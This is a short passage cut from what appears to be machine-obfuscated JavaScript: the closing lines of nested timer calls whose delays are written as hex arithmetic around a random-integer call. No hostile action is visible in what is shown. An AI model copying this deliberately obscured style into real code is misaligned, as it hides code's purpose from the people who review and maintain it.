  }, (-0x945 + -0x28 * 0xef + 0x49f5) * getRandomInt(0x6e + 0x853 + -0x38 * 0x28, 0x1 * 0xf8c + -0x1 * 0xbeb + -0x39c));
}, 0x17b1 + -0xe * -0xa4 + -0x2045);